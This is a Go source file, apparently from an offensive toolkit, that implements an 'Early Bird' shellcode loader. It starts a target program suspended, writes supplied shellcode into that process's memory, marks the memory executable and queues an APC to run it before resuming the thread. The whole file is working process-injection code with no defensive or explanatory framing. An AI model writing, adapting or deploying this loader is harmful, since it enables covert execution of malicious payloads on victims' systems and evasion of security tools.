package loader

import (
	"fmt"
	"unsafe"
	"variant/log"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func EarlyBird(shellcode []byte, path string) {
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}

	program, err := windows.UTF16PtrFromString(path)
	if err != nil {
		log.Fatal(err)
	}
	args, err := windows.UTF16PtrFromString("")
	if err != nil {
		log.Fatal(err)
	}

	err = windows.CreateProcess(
		program,
		args,
		nil, nil, true,
		windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if err != nil {
		log.Fatal(err)
	}

	addr, _, _ := wdll.VirtualAllocEx().Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	fmt.Println("Done")

	_, _, _ = wdll.WriteProcessMemory().Call(uintptr(procInfo.Process), addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := windows.PAGE_READWRITE
	_, _, _ = wdll.VirtualProtectEx().Call(uintptr(procInfo.Process), addr,
		uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	_, _, _ = wdll.QueueUserAPC().Call(addr, uintptr(procInfo.Thread), 0)
	_, _ = windows.ResumeThread(procInfo.Thread)
	_ = windows.CloseHandle(procInfo.Process)
	_ = windows.CloseHandle(procInfo.Thread)
}
